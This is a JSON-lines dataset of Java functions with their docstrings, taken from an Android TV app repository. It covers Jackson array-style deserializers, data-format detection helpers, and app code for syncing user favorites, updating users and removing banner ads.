{"docstring": "/*\n/**********************************************************\n/* Overrides\n/**********************************************************\n */\n", "func_signal": "@Override\npublic String toString()", "code": "{\n    StringBuilder sb = new StringBuilder();\n    sb.append('[');\n    final int len = _readers.length;\n    if (len > 0) {\n        sb.append(_readers[0].getFactory().getFormatName());\n        for (int i = 1; i < len; ++i) {\n            sb.append(\", \");\n            sb.append(_readers[i].getFactory().getFormatName());\n        }\n    }\n    sb.append(']');\n    return sb.toString();\n}", "path": "joytv\\src\\com\\fasterxml\\jackson\\databind\\deser\\DataFormatReaders.java", "repo_name": "joyplus/joyplus-tv", "stars": 79, "license": "other", "language": "java", "size": 12946}
{"docstring": "//\tclass CheckPlayUrl implements Runnable {\n//\n//\t\t@Override\n//\t\tpublic void run() {\n//\t\t\t// TODO Auto-generated method stub\n//\n//\t\t\tfor (int i = 0; i < hot_list.size(); i++) {\n//\t\t\t\tHotItemInfo info = hot_list.get(i);\n//\t\t\t\tif (info.type > 0) {\n//\t\t\t\t\tList<URLS_INDEX> playUrls = new ArrayList<URLS_INDEX>();\n//\t\t\t\t\tfor (int j = 0; j < info.play_urls.length; j++) {\n//\t\t\t\t\t\tfor (int k = 0; k < info.play_urls[j].urls.length; k++) {\n//\t\t\t\t\t\t\tURLS_INDEX url_index = new URLS_INDEX();\n//\t\t\t\t\t\t\turl_index.url = info.play_urls[j].urls[k].url;\n//\t\t\t\t\t\t\turl_index.source_from = info.play_urls[j].source;\n//\t\t\t\t\t\t\tif (info.play_urls[j].source.trim()\n//\t\t\t\t\t\t\t\t\t.equalsIgnoreCase(Constant.video_index[0])) {\n//\t\t\t\t\t\t\t\turl_index.souces = 0;\n//\t\t\t\t\t\t\t} else if (info.play_urls[j].source.trim()\n//\t\t\t\t\t\t\t\t\t.equalsIgnoreCase(Constant.video_index[1])) {\n//\t\t\t\t\t\t\t\turl_index.souces = 1;\n//\t\t\t\t\t\t\t} else if (info.play_urls[j].source.trim()\n//\t\t\t\t\t\t\t\t\t.equalsIgnoreCase(Constant.video_index[2])) {\n//\t\t\t\t\t\t\t\turl_index.souces = 2;\n//\t\t\t\t\t\t\t} else if (info.play_urls[j].source.trim()\n//\t\t\t\t\t\t\t\t\t.equalsIgnoreCase(Constant.video_index[3])) {\n//\t\t\t\t\t\t\t\turl_index.souces = 3;\n//\t\t\t\t\t\t\t} else if (info.play_urls[j].source.trim()\n//\t\t\t\t\t\t\t\t\t.equalsIgnoreCase(Constant.video_index[4])) {\n//\t\t\t\t\t\t\t\turl_index.souces = 4;\n//\t\t\t\t\t\t\t} else if (info.play_urls[j].source.trim()\n//\t\t\t\t\t\t\t\t\t.equalsIgnoreCase(Constant.video_index[5])) {\n//\t\t\t\t\t\t\t\turl_index.souces = 5;\n//\t\t\t\t\t\t\t} else if (info.play_urls[j].source.trim()\n//\t\t\t\t\t\t\t\t\t.equalsIgnoreCase(Constant.video_index[6])) {\n//\t\t\t\t\t\t\t\turl_index.souces = 6;\n//\t\t\t\t\t\t\t} else if (info.play_urls[j].source.trim()\n//\t\t\t\t\t\t\t\t\t.equalsIgnoreCase(Constant.video_index[7])) {\n//\t\t\t\t\t\t\t\turl_index.souces = 7;\n//\t\t\t\t\t\t\t} else if (info.play_urls[j].source.trim()\n//\t\t\t\t\t\t\t\t\t.equalsIgnoreCase(Constant.video_index[8])) {\n//\t\t\t\t\t\t\t\turl_index.souces = 8;\n//\t\t\t\t\t\t\t} else if (info.play_urls[j].source.trim()\n//\t\t\t\t\t\t\t\t\t.equalsIgnoreCase(Constant.video_index[9])) {\n//\t\t\t\t\t\t\t\turl_index.souces = 9;\n//\t\t\t\t\t\t\t} else if (info.play_urls[j].source.trim()\n//\t\t\t\t\t\t\t\t\t.equalsIgnoreCase(Constant.video_index[10])) {\n//\t\t\t\t\t\t\t\turl_index.souces = 10;\n//\t\t\t\t\t\t\t} else if (info.play_urls[j].source.trim()\n//\t\t\t\t\t\t\t\t\t.equalsIgnoreCase(Constant.video_index[11])) {\n//\t\t\t\t\t\t\t\turl_index.souces = 11;\n//\t\t\t\t\t\t\t} else {\n//\t\t\t\t\t\t\t\turl_index.souces = 12;\n//\t\t\t\t\t\t\t}\n//\t\t\t\t\t\t\tif (info.play_urls[j].urls[k].type.trim()\n//\t\t\t\t\t\t\t\t\t.equalsIgnoreCase(\n//\t\t\t\t\t\t\t\t\t\t\tConstant.player_quality_index[1])) {\n//\t\t\t\t\t\t\t\turl_index.defination = 1;\n//\t\t\t\t\t\t\t} else if (info.play_urls[j].urls[k].type.trim()\n//\t\t\t\t\t\t\t\t\t.equalsIgnoreCase(\n//\t\t\t\t\t\t\t\t\t\t\tConstant.player_quality_index[0])) {\n//\t\t\t\t\t\t\t\turl_index.defination = 2;\n//\t\t\t\t\t\t\t} else if (info.play_urls[j].urls[k].type.trim()\n//\t\t\t\t\t\t\t\t\t.equalsIgnoreCase(\n//\t\t\t\t\t\t\t\t\t\t\tConstant.player_quality_index[2])) {\n//\t\t\t\t\t\t\t\turl_index.defination = 3;\n//\t\t\t\t\t\t\t} else if (info.play_urls[j].urls[k].type.trim()\n//\t\t\t\t\t\t\t\t\t.equalsIgnoreCase(\n//\t\t\t\t\t\t\t\t\t\t\tConstant.player_quality_index[3])) {\n//\t\t\t\t\t\t\t\turl_index.defination = 4;\n//\t\t\t\t\t\t\t} else {\n//\t\t\t\t\t\t\t\turl_index.defination = 5;\n//\t\t\t\t\t\t\t}\n//\t\t\t\t\t\t\tplayUrls.add(url_index);\n//\t\t\t\t\t\t}\n//\t\t\t\t\t}\n//\n//\t\t\t\t\tif (playUrls.size() > 1) {\n//\t\t\t\t\t\tCollections.sort(playUrls,\n//\t\t\t\t\t\t\t\tnew DefinationComparatorIndex());\n//\t\t\t\t\t\tCollections.sort(playUrls, new SouceComparatorIndex1());\n//\t\t\t\t\t}\n//\t\t\t\t\tLog.d(TAG, \"test------------------\" + i\n//\t\t\t\t\t\t\t+ \"playUrls size = \" + playUrls.size() + \"name = \"\n//\t\t\t\t\t\t\t+ info.prod_name);\n//\t\t\t\t\tfor (int n = 0; info.video_url == null\n//\t\t\t\t\t\t\t&& n < playUrls.size(); n++) {\n//\t\t\t\t\t\tString url = playUrls.get(n).url;\n//\t\t\t\t\t\tif (app.CheckUrl(url)) {\n//\t\t\t\t\t\t\tLog.d(TAG, \"url-------ok----->\" + url);\n//\t\t\t\t\t\t\thot_list.get(i).video_url = url;\n//\t\t\t\t\t\t\thot_list.get(i).source = playUrls.get(n).source_from;\n//\t\t\t\t\t\t}\n//\t\t\t\t\t}\n//\t\t\t\t}\n//\t\t\t}\n//\t\t}\n//\n//\t}\n\t/*\n\t * @remove banner\n\t */\n", "func_signal": "private void removeBanner()", "code": "{\n\t\tif(mAdView!=null){\n\t\t\tlayout.removeView(mAdView);\n\t\t\tmAdView = null;\n\t\t}\n\t}", "path": "joytv\\src\\com\\joyplus\\tv\\Main1.java", "repo_name": "joyplus/joyplus-tv", "stars": 79, "license": "other", "language": "java", "size": 12946}
{"docstring": "// \u7f51\u4e0a\u7528\u6237id\u6570\u636e\u548c\u672c\u5730\u7528\u6237id\u6570\u636e\u8fdb\u884c\u6bd4\u8f83\n// \u4ee5\u7f51\u4e0a\u6570\u636e\u4e3a\u6807\u51c6\uff0c\u5982\u679c\u672c\u5730\u7528\u6237id\u6570\u636e\u591a\u4f59\u7684\u5c31\u5220\u9664\uff0c\u4e0d\u5b58\u5728\u7684\u5c31\u8fdb\u884c\u6dfb\u52a0\n", "func_signal": "private void compareUsrFav4DB(List<HotItemInfo> list, String userId)", "code": "{\n\n\tif (list == null) {\n\n\t\treturn;\n\t}\n\n\tboolean isUpdateThisTime = false;// \u672c\u6b21\u662f\u5426\u6709\u6536\u85cf\u66f4\u65b0\n\n\tString selection = UserShouCang.USER_ID + \"=?\";// \u901a\u8fc7\u7528\u6237id\uff0c\u627e\u5230\u76f8\u5e94\u4fe1\u606f\n\tString[] selectionArgs = { userId };\n\n\tTvDatabaseHelper helper = TvDatabaseHelper\n\t\t\t.newTvDatabaseHelper(getApplicationContext());\n\tSQLiteDatabase database = helper.getWritableDatabase();// \u83b7\u53d6\u5199db\n\n\tString[] columns = { UserShouCang.PRO_ID, UserShouCang.PRO_TYPE,\n\t\t\tUserShouCang.CUR_EPISODE };// \u8fd4\u56de\u5f71\u7247id \u7c7b\u578b\u548c\u5f53\u524d\u66f4\u65b0\u96c6\u6570\n\tCursor cursor_proId = database.query(\n\t\t\tTvDatabaseHelper.ZHUIJU_TABLE_NAME, columns, selection,\n\t\t\tselectionArgs, null, null, null);\n\n\tif (list.size() > 0) {// \u5f53\u7528\u6237\u6709\u6536\u85cf\u65f6\n\n\t\tif (cursor_proId != null && cursor_proId.getCount() > 0) {// \u6570\u636e\u5e93\u6709\u6570\u636e\n\n\t\t\tList<HotItemInfo> dbList = new ArrayList<HotItemInfo>();// \u6570\u636e\u5e93list\uff0c\u53ea\u53d6\u5176\u4e2did\u3001type\u3001cur_episode\n\n\t\t\twhile (cursor_proId.moveToNext()) {\n\n\t\t\t\tint indexId = cursor_proId\n\t\t\t\t\t\t.getColumnIndex(UserShouCang.PRO_ID);\n\t\t\t\tint indexType = cursor_proId\n\t\t\t\t\t\t.getColumnIndex(UserShouCang.PRO_TYPE);\n\t\t\t\tint indexCurEpisode = cursor_proId\n\t\t\t\t\t\t.getColumnIndex(UserShouCang.CUR_EPISODE);\n\n\t\t\t\tHotItemInfo info = new HotItemInfo();\n\n\t\t\t\tif (indexId != -1) {\n\n\t\t\t\t\tLog.i(TAG,\n\t\t\t\t\t\t\t\"compareUsrFav4DB--->:pro_id\"\n\t\t\t\t\t\t\t\t\t+ cursor_proId.getString(indexId));\n\t\t\t\t\tinfo.prod_id = cursor_proId.getString(indexId);// \u628a\u7528\u6237id\u4fe1\u606f\u5f71\u7247id\u5b58\u50a8\u5230\u5b57\u7b26\u4e32\u4e2d\n\t\t\t\t\tinfo.prod_type = cursor_proId.getString(indexType);\n\t\t\t\t\tinfo.cur_episode = cursor_proId\n\t\t\t\t\t\t\t.getString(indexCurEpisode);\n\n\t\t\t\t}\n\n\t\t\t\tdbList.add(info);\n\t\t\t}\n\n\t\t\tfor (int i = 0; i < dbList.size(); i++)\n\t\t\t\tLog.i(TAG, \"db ids---->\" + dbList.get(i).prod_id);\n\n\t\t\tfor (int i = 0; i < list.size(); i++)\n\t\t\t\tLog.i(TAG, \"netWork ids---->\" + list.get(i).prod_id);\n\n\t\t\t// \u4ee5\u7f51\u7edc\u7684\u6570\u636e\u4e3a\u6807\u51c6 A \u6570\u636e\u5e93\u4e3aB\n\t\t\t// \u76f8\u540clist\u96c6\u5408 network\n\t\t\tList<HotItemInfo> sameList4NetWork = UtilTools\n\t\t\t\t\t.sameList4NetWork(list, dbList);\n\t\t\t// \u76f8\u540clist\u96c6\u5408 network\n\t\t\tList<HotItemInfo> sameList4DB = UtilTools.sameList4DB(\n\t\t\t\t\tlist, dbList);\n\t\t\t// \u4e0d\u540c\u6570\u636e\u96c6\u5408 network\n\t\t\tList<HotItemInfo> differentList = UtilTools\n\t\t\t\t\t.differentList4NetWork(list, dbList);\n\t\t\tLog.i(TAG, \"differentList---->\" + differentList.size());\n\n\t\t\t// \u9996\u5148\u6570\u636e\u5e93\u6570\u636e\u5168\u90e8\u6539\u4e3a\u65e7\u6570\u636e\n\t\t\tContentValues contentValues = new ContentValues();\n\t\t\tcontentValues.put(UserShouCang.IS_NEW, DataBaseItems.OLD);\n\t\t\tdatabase.update(TvDatabaseHelper.ZHUIJU_TABLE_NAME,\n\t\t\t\t\tcontentValues, selection, selectionArgs);\n\n\t\t\t// A\u4e0eB\u76f8\u540c\u7684\u4fe1\u606f\uff0c\u6570\u636e\u66f4\u65b0\u4e3a\u65b0\u7684\n\t\t\tfor (int i = 0; i < sameList4NetWork.size(); i++) {\n\n\t\t\t\tContentValues tempValues = new ContentValues();\n\t\t\t\ttempValues.put(UserShouCang.IS_NEW, DataBaseItems.NEW);\n\t\t\t\tString tempSelection = UserShouCang.PRO_ID + \"=? and \"\n\t\t\t\t\t\t+ UserShouCang.USER_ID + \"=?\";\n\t\t\t\tString[] tempselectionArgs = {sameList4NetWork.get(i).prod_id, userId };\n\n\t\t\t\t// A\u4e0eB\u6709\u76f8\u540c\u6570\u636e\uff0c\u6bd4\u8f83\u5176cur_episode\uff0c\u5982\u679cA\u4e2d\u4e0d\u7b49\u4e8eB\u4e2d\u6570\u636e\uff0c\u628aIS_UPDATE\u6539\u4e3anew\n\t\t\t\tString type = sameList4NetWork.get(i).prod_type;\n\t\t\t\tif (type != null) {\n\t\t\t\t\t// \u5982\u679c\u76f8\u540c\u6570\u636e\u6709\u7535\u89c6\u5267\u3001\u52a8\u6f2b\u548c\u7efc\u827a\u7c7b\u578b\n\t\t\t\t\tif (type.equals(BangDanConstant.TV_TYPE)\n\t\t\t\t\t\t\t|| type.equals(BangDanConstant.DONGMAN_TYPE)\n\t\t\t\t\t\t\t|| type.equals(BangDanConstant.ZONGYI_TYPE)) {\n\n\t\t\t\t\t\tif (!sameList4NetWork.get(i).cur_episode\n\t\t\t\t\t\t\t\t.equals(sameList4DB.get(i).cur_episode)) {\n\n\t\t\t\t\t\t\tDBUtils.updateHotItemInfo2DB(\n\t\t\t\t\t\t\t\t\tgetApplicationContext(),\n\t\t\t\t\t\t\t\t\tsameList4NetWork.get(i), userId,\n\t\t\t\t\t\t\t\t\tdatabase);\n\t\t\t\t\t\t\tisUpdateThisTime = true;\n\t\t\t\t\t\t}\n\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tdatabase.update(TvDatabaseHelper.ZHUIJU_TABLE_NAME,\n\t\t\t\t\t\ttempValues, tempSelection, tempselectionArgs);\n\t\t\t}\n\n\t\t\t// \u63d2\u5165A\u4e0d\u540c\u7684\u6570\u636e\n\t\t\tfor (int i = 0; i < differentList.size(); i++) {\n\n\t\t\t\tHotItemInfo info = differentList.get(i);\n\n\t\t\t\tDBUtils.insertHotItemInfo2DB(\n\t\t\t\t\t\tgetApplicationContext(), info, userId, database);\n\t\t\t}\n\n\t\t\t// \u5220\u9664\u6389\u65e7\u7684\u6570\u636e \u901a\u8fc7\u65b0\u65e7\u6570\u636e\u6807\u8bb0\u6765\u5220\u9664\n\t\t\tString deleteSelection = UserShouCang.IS_NEW + \"=? and \"\n\t\t\t\t\t+ UserShouCang.USER_ID + \"=?\";\n\t\t\tString[] deleteselectionArgs = { DataBaseItems.OLD + \"\", userId };\n\t\t\tdatabase.delete(TvDatabaseHelper.ZHUIJU_TABLE_NAME,\n\t\t\t\t\tdeleteSelection, deleteselectionArgs);\n\n\t\t} else {// \u6570\u636e\u5e93\u6ca1\u6709\u6570\u636e\n\t\t\t// \u628a\u4e0b\u8f7d\u7684\u6570\u636e\u63d2\u5165\u5230\u6570\u636e\u5e93\n\t\t\tfor (HotItemInfo info : list) {\n\n\t\t\t\tDBUtils.insertHotItemInfo2DB(\n\t\t\t\t\t\tgetApplicationContext(), info, userId, database);\n\t\t\t}\n\t\t}\n\n\t} else {// \u5982\u679c\u7f51\u4e0a\u6b64\u7528\u6237\u6ca1\u6709\u4efb\u4f55\u6536\u85cf,\u4f46\u662f\u6570\u636e\u5e93\u4e2d\u6709\u76f8\u5e94\u7528\u6237\u6570\u636e\uff0c\u6e05\u7a7a\u6389\u6b64\u7528\u6237\u6570\u636e\n\n\t\tif (cursor_proId != null && cursor_proId.getCount() > 0) {// \u6570\u636e\u5e93\u6709\u6570\u636e\n\n\t\t\tdatabase.delete(TvDatabaseHelper.ZHUIJU_TABLE_NAME, selection,\n\t\t\t\t\tselectionArgs);\n\t\t}\n\t}\n\n\tcursor_proId.close();// \u5173\u95ed\n\thelper.closeDatabase();// \u5173\u95ed\u6570\u636e\u5e93\n\n\tLog.i(TAG, \"isUpdateThisTime--->\" + isUpdateThisTime);\n\n\t// \u672c\u6b21\u662f\u5426\u6709\u6536\u85cf\u66f4\u65b0\u6210\u529f\n\tif (isUpdateThisTime) {// \u5982\u679c\u6210\u529f\u66f4\u65b0\n\n\t\tboolean is48TimeClock = UtilTools\n\t\t\t\t.is48TimeClock(getApplicationContext());// \u662f\u5426\u5f00\u542f\u95f9\u949f\n\n\t\tAlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);\n\t\tlong time =System.currentTimeMillis()+ 48 * 60 * 60 * 1000;//\u6559\u8bad\n\t\t// long time = 1000;\n\n\t\tPendingIntent pi = PendingIntent.getBroadcast(this, 0, new Intent(\n\t\t\t\tthis, AlarmBroadcastReceiver.class),\n\t\t\t\tIntent.FLAG_ACTIVITY_NEW_TASK);\n\t\tam.set(AlarmManager.RTC_WAKEUP, time, pi);\n\t\tif (!is48TimeClock) {// \u5982\u679c\u95f9\u949f\u6ca1\u6709\u5f00\u542f\uff0c\u5b58\u50a8\u5f00\u542f\u72b6\u6001\n\n\t\t\tUtilTools.set48TimeClock(getApplicationContext(), true);\n\t\t}\n\t}\n\n\tUtilTools.setCurrentUserId(getApplicationContext(), userId);\n\n}", "path": "joytv\\src\\com\\joyplus\\tv\\Main1.java", "repo_name": "joyplus/joyplus-tv", "stars": 79, "license": "other", "language": "java", "size": 12946}
{"docstring": "/*\n/**********************************************************\n/* JsonDeserializer implementation\n/**********************************************************\n */\n", "func_signal": "@Override\npublic Object deserialize(JsonParser jp, DeserializationContext ctxt)\n    throws IOException, JsonProcessingException", "code": "{\n    // Let's delegate just in case we got a JSON Object (could error out, alternatively?)\n    if (jp.getCurrentToken() != JsonToken.START_ARRAY) {\n        return _deserializeFromNonArray(jp, ctxt);\n    }\n    if (!_vanillaProcessing) {\n        return _deserializeNonVanilla(jp, ctxt);\n    }\n    final Object bean = _valueInstantiator.createUsingDefault(ctxt);\n    final SettableBeanProperty[] props = _orderedProperties;\n    int i = 0;\n    final int propCount = props.length;\n    while (true) {\n        if (jp.nextToken() == JsonToken.END_ARRAY) {\n            return bean;\n        }\n        if (i == propCount) {\n            break;\n        }\n        SettableBeanProperty prop = props[i];\n        if (prop != null) { // normal case\n            try {\n                prop.deserializeAndSet(jp, ctxt, bean);\n            } catch (Exception e) {\n                wrapAndThrow(e, bean, prop.getName(), ctxt);\n            }\n        } else { // just skip?\n            jp.skipChildren();\n        }\n        ++i;\n    }\n    // Ok; extra fields? Let's fail, unless ignoring extra props is fine\n    if (!_ignoreAllUnknown) {\n        throw ctxt.mappingException(\"Unexpected JSON values; expected at most \"+propCount+\" properties (in JSON Array)\");\n    }\n    // otherwise, skip until end\n    while (jp.nextToken() != JsonToken.END_ARRAY) {\n        jp.skipChildren();\n    }\n    return bean;\n}", "path": "joytv\\src\\com\\fasterxml\\jackson\\databind\\deser\\impl\\BeanAsArrayDeserializer.java", "repo_name": "joyplus/joyplus-tv", "stars": 79, "license": "other", "language": "java", "size": 12946}
{"docstring": "/**\n * Method called to deserialize bean using \"property-based creator\":\n * this means that a non-default constructor or factory method is\n * called, and then possibly other setters. The trick is that\n * values for creator method need to be buffered, first; and \n * due to non-guaranteed ordering possibly some other properties\n * as well.\n */\n", "func_signal": "protected final Object _deserializeUsingPropertyBased(final JsonParser jp, final DeserializationContext ctxt)\n    throws IOException, JsonProcessingException", "code": "{\n    final PropertyBasedCreator creator = _propertyBasedCreator;\n    PropertyValueBuffer buffer = creator.startBuilding(jp, ctxt, _objectIdReader);\n\n    final SettableBeanProperty[] props = _orderedProperties;\n    final int propCount = props.length;\n    int i = 0;\n    Object bean = null;\n    \n    for (; jp.nextToken() != JsonToken.END_ARRAY; ++i) {\n        SettableBeanProperty prop = (i < propCount) ? props[i] : null;\n        if (prop == null) { // we get null if there are extra elements; maybe otherwise too?\n            jp.skipChildren();\n            continue;\n        }\n        // if we have already constructed POJO, things are simple:\n        if (bean != null) {\n            try {\n                prop.deserializeAndSet(jp, ctxt, bean);\n            } catch (Exception e) {\n                wrapAndThrow(e, bean, prop.getName(), ctxt);\n            }\n            continue;\n        }\n        final String propName = prop.getName();\n        // if not yet, maybe we got a creator property?\n        SettableBeanProperty creatorProp = creator.findCreatorProperty(propName);\n        if (creatorProp != null) {\n            // Last creator property to set?\n            Object value = creatorProp.deserialize(jp, ctxt);\n            if (buffer.assignParameter(creatorProp.getCreatorIndex(), value)) {\n                try {\n                    bean = creator.build(ctxt, buffer);\n                } catch (Exception e) {\n                    wrapAndThrow(e, _beanType.getRawClass(), propName, ctxt);\n                    continue; // never gets here\n                }\n                //  polymorphic?\n                if (bean.getClass() != _beanType.getRawClass()) {\n                    /* 23-Jul-2012, tatu: Not sure if these could ever be properly\n                     *   supported (since ordering of elements may not be guaranteed);\n                     *   but make explicitly non-supported for now.\n                     */\n                    throw ctxt.mappingException(\"Can not support implicit polymorphic deserialization for POJOs-as-Arrays style: \"\n                            +\"nominal type \"+_beanType.getRawClass().getName()+\", actual type \"+bean.getClass().getName());\n                }\n            }\n            continue;\n        }\n        // Object Id property?\n        if (buffer.readIdProperty(propName)) {\n            continue;\n        }\n        // regular property? needs buffering\n        buffer.bufferProperty(prop, prop.deserialize(jp, ctxt));\n    }\n\n    // In case we didn't quite get all the creator properties, we may have to do this:\n    if (bean == null) {\n        try {\n            bean = creator.build(ctxt, buffer);\n        } catch (Exception e) {\n            wrapInstantiationProblem(e, ctxt);\n            return null; // never gets here\n        }\n    }\n    return bean;\n}", "path": "joytv\\src\\com\\fasterxml\\jackson\\databind\\deser\\impl\\BeanAsArrayDeserializer.java", "repo_name": "joyplus/joyplus-tv", "stars": 79, "license": "other", "language": "java", "size": 12946}
{"docstring": "// private void changeContent1(int dx){\n// final int positon = gallery1.getSelectedItemPosition();\n// switch (titleGroup.getSelectedTitleIndex()) {\n// case 1:\n//\n// // hot_name_tv = (TextView) hotView.findViewById(R.id.hot_content_name);\n// // hot_score_tv = (TextView)\n// hotView.findViewById(R.id.hot_content_score);\n// // hot_directors_tv = (TextView)\n// hotView.findViewById(R.id.hot_content_directors);\n// // hot_starts_tv = (TextView)\n// hotView.findViewById(R.id.hot_content_stars);\n// // hot_introduce_tv = (TextView)\n// hotView.findViewById(R.id.hot_content_introduce);\n// // Log.d(TAG, \"------------------------\");\n//\n// //\n// aq.id(highlightImageView).image(hot_list.get(positon+dx).prod_pic_url,true,true);\n//\n// ImageView img = (ImageView)\n// gallery1.findViewWithTag(hot_list.get(positon+dx).prod_pic_url);\n// if(img != null){\n// highlightImageView.setImageDrawable(img.getDrawable());\n// }else{\n// aq.id(highlightImageView).image(hot_list.get(positon+dx).prod_pic_url,true,true);\n// }\n// // if(dx==1){\n// // itemFram.startAnimation(leftTranslateAnimationStep2);\n// // }\n// // if(dx==-1){\n// // itemFram.startAnimation(rightTranslateAnimationStep2);\n// // }\n//\n// if(indexCaces.get(1)!=null&&indexCaces.get(1)<positon){\n// itemFram.startAnimation(leftTranslateAnimationStep2);\n// }\n// Log.d(TAG, \"positon = \" + positon + \"laset = \" + indexCaces.get(1));\n// if(indexCaces.get(1)!=null&&indexCaces.get(1)>positon){\n// itemFram.startAnimation(rightTranslateAnimationStep2);\n// }\n//\n// // itemFram.setVisibility(View.GONE);\n// handler.removeCallbacksAndMessages(null);\n// handler.postDelayed((new Runnable() {\n//\n// @Override\n// public void run() {\n// // TODO Auto-generated method stub\n// contentLayout.removeAllViews();\n// View hotView = hot_contentViews.get(positon);\n// hotView.setLayoutParams(new\n// LayoutParams(LayoutParams.MATCH_PARENT,LayoutParams.MATCH_PARENT));\n// contentLayout.startAnimation(alpha_appear);\n// contentLayout.addView(hotView);\n// }\n// }),280);\n//\n//\n// // contentLayout.startAnimation(alpha_appear);\n// // hotView.invalidate();\n//\n// // aq.id(R.id.hot_content_name).text(hot_list.get(positon+dx).prod_name);\n// // aq.id(R.id.hot_content_score).text(hot_list.get(positon+dx).score);\n// //\n// aq.id(R.id.hot_content_directors).text(hot_list.get(positon+dx).directors);\n// // aq.id(R.id.hot_content_stars).text(hot_list.get(positon+dx).stars);\n// //\n// aq.id(R.id.hot_content_introduce).text(hot_list.get(positon+dx).prod_summary);\n// break;\n// case 2:\n// highlightImageView.setImageResource(resouces_lib_active[positon]);\n// noticeView.setText(positon+1 + \"/\" + resouces_lib_active.length);\n// contentLayout.removeAllViews();\n// yeuDanView.setLayoutParams(new\n// LayoutParams(LayoutParams.MATCH_PARENT,LayoutParams.MATCH_PARENT));\n// contentLayout.startAnimation(alpha_appear);\n// contentLayout.addView(yeuDanView);\n// break;\n// case 3:\n// highlightImageView.setImageResource(resouces_lib_active[positon]);\n// noticeView.setText(positon+1 + \"/\" + resouces_lib_active.length);\n// break;\n// case 4:\n// highlightImageView.setImageResource(resouces_my_active[positon]);\n// noticeView.setText(positon+1 + \"/\" + resouces_my_active.length);\n// break;\n// default:\n// break;\n// }\n// }\n", "func_signal": "private void updateUser(String userId)", "code": "{\n\t// TODO Auto-generated method stub\n\tif (userId.equals(app.getUserData(\"userId\"))) {\n\t\tUserInfo currentUserInfo = new UserInfo();\n\t\tcurrentUserInfo.setUserId(app.getUserData(\"userId\"));\n\t\tcurrentUserInfo.setUserName(app.getUserData(\"userName\"));\n\t\tcurrentUserInfo.setUserAvatarUrl(app.getUserData(\"userAvatarUrl\"));\n\t\theaders.put(\"user_id\", currentUserInfo.getUserId());\n\t\tapp.setUser(currentUserInfo);\n\t\tsendBroadcast(new Intent(ACTION_USERUPDATE));\n\t\thandler.sendEmptyMessage(MESSAGE_UPDATEUSER);//\u5f53\u5207\u6362\u7528\u6237id\u65f6\uff0c\u91cd\u65b0\u52a0\u8f7d\u9875\u9762\n\t} else {\n\t\tString url = Constant.BASE_URL + \"user/view?userid=\" + userId;\n\t\tAjaxCallback<JSONObject> cb = new AjaxCallback<JSONObject>();\n\t\tcb.url(url).type(JSONObject.class)\n\t\t\t\t.weakHandler(this, \"getBandUserInfoResult\");\n\t\tcb.SetHeader(app.getHeaders());\n\t\taq.ajax(cb);\n\t}\n}", "path": "joytv\\src\\com\\joyplus\\tv\\Main1.java", "repo_name": "joyplus/joyplus-tv", "stars": 79, "license": "other", "language": "java", "size": 12946}
{"docstring": "/**\n * Alternate deserialization method that has to check many more configuration\n * aspects than the \"vanilla\" processing.\n */\n", "func_signal": "protected Object _deserializeNonVanilla(JsonParser jp, DeserializationContext ctxt)\n    throws IOException, JsonProcessingException", "code": "{\n    if (_nonStandardCreation) {\n        return _deserializeWithCreator(jp, ctxt);\n    }\n    final Object bean = _valueInstantiator.createUsingDefault(ctxt);\n    if (_injectables != null) {\n        injectValues(ctxt, bean);\n    }\n    Class<?> activeView = _needViewProcesing ? ctxt.getActiveView() : null;\n    final SettableBeanProperty[] props = _orderedProperties;\n    int i = 0;\n    final int propCount = props.length;\n    while (true) {\n        if (jp.nextToken() == JsonToken.END_ARRAY) {\n            return bean;\n        }\n        if (i == propCount) {\n            break;\n        }\n        SettableBeanProperty prop = props[i];\n        ++i;\n        if (prop != null) { // normal case\n            if (activeView == null || prop.visibleInView(activeView)) {\n                try {\n                    prop.deserializeAndSet(jp, ctxt, bean);\n                } catch (Exception e) {\n                    wrapAndThrow(e, bean, prop.getName(), ctxt);\n                }\n                continue;\n            }\n        }\n        // otherwise, skip it (view-filtered, no prop etc)\n        jp.skipChildren();\n    }\n    // Ok; extra fields? Let's fail, unless ignoring extra props is fine\n    if (!_ignoreAllUnknown) {\n        throw ctxt.mappingException(\"Unexpected JSON values; expected at most \"+propCount+\" properties (in JSON Array)\");\n    }\n    // otherwise, skip until end\n    while (jp.nextToken() != JsonToken.END_ARRAY) {\n        jp.skipChildren();\n    }\n    return bean;\n}", "path": "joytv\\src\\com\\fasterxml\\jackson\\databind\\deser\\impl\\BeanAsArrayDeserializer.java", "repo_name": "joyplus/joyplus-tv", "stars": 79, "license": "other", "language": "java", "size": 12946}
{"docstring": "/**\n * Method to use for accessing input for which format detection has been done.\n * This <b>must</b> be used instead of using stream passed to detector\n * unless given stream itself can do buffering.\n * Stream will return all content that was read during matching process, as well\n * as remaining contents of the underlying stream.\n */\n", "func_signal": "public InputStream getDataStream()", "code": "{\n    if (_originalStream == null) {\n        return new ByteArrayInputStream(_bufferedData, _bufferedStart, _bufferedLength);\n    }\n    return new MergedStream(null, _originalStream, _bufferedData, _bufferedStart, _bufferedLength);\n}", "path": "joytv\\src\\com\\fasterxml\\jackson\\databind\\deser\\DataFormatReaders.java", "repo_name": "joyplus/joyplus-tv", "stars": 79, "license": "other", "language": "java", "size": 12946}
{"docstring": "/**\n * Convenience method for trying to construct a {@link JsonParser} for\n * parsing content which is assumed to be in detected data format.\n * If no match was found, returns null.\n */\n", "func_signal": "public JsonParser createParserWithMatch() throws IOException", "code": "{\n    if (_match == null) {\n        return null;\n    }\n    JsonFactory jf = _match.getFactory();\n    if (_originalStream == null) {\n        return jf.createParser(_bufferedData, _bufferedStart, _bufferedLength);\n    }\n    return jf.createParser(getDataStream());\n}", "path": "joytv\\src\\com\\fasterxml\\jackson\\databind\\deser\\DataFormatReaders.java", "repo_name": "joyplus/joyplus-tv", "stars": 79, "license": "other", "language": "java", "size": 12946}
